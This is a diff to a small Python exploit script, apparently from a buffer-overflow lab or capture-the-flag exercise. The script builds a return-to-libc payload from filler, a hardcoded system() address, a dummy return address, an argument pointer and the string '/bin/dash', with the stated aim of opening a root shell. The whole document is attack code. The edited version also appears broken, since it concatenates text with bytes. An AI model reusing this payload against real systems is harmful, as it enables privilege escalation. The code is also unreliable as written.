@@ -3,8 +3,8 @@ from struct import pack
 
 #Need to run /bin/sh and open a root shell
 filler = "D"*22
-ret = pack("<I", 0x0804ef50) #start of system
+ret= 0x0804ef50.to_bytes(4, "little")#start of systemx
 dummy_ret = "f"*4
-arg = pack("<I", 0xbffefaa8) #wherever shell code string is
+arg= 0xbffefaa8.to_bytes(4, "little") #wherever shell code string is
 command = "/bin/dash"
-print (filler + ret + dummy_ret  + command)
+print (filler + ret + dummy_ret + arg + command)
